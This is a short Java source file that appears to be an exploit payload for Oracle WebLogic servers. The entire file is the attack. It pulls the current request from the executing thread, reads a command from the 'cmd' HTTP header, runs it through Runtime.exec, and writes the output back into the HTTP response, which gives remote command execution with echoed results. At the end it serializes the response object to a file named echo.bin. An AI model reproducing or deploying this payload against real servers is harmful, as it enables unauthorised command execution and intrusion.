import java.io.*;


public class Echo {

    public static void main(String[] args) throws Exception {

        weblogic.work.WorkAdapter adapter = ((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork();
        String cmd = (String) adapter.getClass().getMethod("getHeader", String.class).invoke(adapter, "cmd");
        String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
        weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) adapter.getClass().getMethod("getResponse").invoke(adapter);
        res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
        res.getServletOutputStream().flush();
        res.getWriter().write("");


        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("echo.bin"));
        oos.writeObject(res);

    }
}
